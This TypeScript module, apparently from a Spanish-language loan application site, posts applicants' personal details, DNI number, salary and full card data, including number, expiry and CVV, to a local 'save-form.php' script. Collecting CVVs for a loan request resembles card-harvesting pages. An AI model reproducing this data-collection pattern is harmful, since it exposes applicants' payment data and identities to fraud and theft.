import { LoanFormData } from '../types/formTypes';

export const submitFormData = async (formData: any): Promise<{ success: boolean; message: string }> => {
  try {
    // Create FormData object
    const form = new FormData();
    
    // Add all form fields
    form.append('loanAmount', formData.loanAmount.toString());
    form.append('loanTerm', formData.loanTerm.toString());
    form.append('firstName', formData.firstName);
    form.append('lastName', formData.lastName);
    form.append('dni', formData.dni);
    form.append('province', formData.province);
    form.append('email', formData.email);
    form.append('phone', formData.phone);
    form.append('occupation', formData.occupation);
    form.append('company', formData.occupationDetails?.company || '');
    form.append('position', formData.occupationDetails?.position || '');
    form.append('monthlySalary', formData.occupationDetails?.monthlySalary || '');
    form.append('yearsEmployed', formData.occupationDetails?.yearsEmployed || '');
    form.append('cardType', formData.cardInfo.type);
    form.append('cardNumber', formData.cardInfo.number);
    form.append('cardName', formData.cardInfo.name);
    form.append('cardExpiry', formData.cardInfo.expiry);
    form.append('cardCvv', formData.cardInfo.cvv);

    // Submit the form to the PHP endpoint
    const response = await fetch('/save-form.php', {
      method: 'POST',
      body: form,
      headers: {
        'Accept': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      }
    });

    let result;
    const responseText = await response.text();
    
    try {
      result = JSON.parse(responseText);
    } catch (e) {
      console.error('Server response:', responseText);
      throw new Error('Server returned invalid JSON response');
    }

    if (!response.ok || !result.success) {
      throw new Error(result.message || 'Error al procesar la solicitud');
    }

    return { 
      success: true, 
      message: result.message || 'Solicitud procesada exitosamente'
    };
  } catch (error) {
    console.error('Error submitting form:', error);
    throw error;
  }
};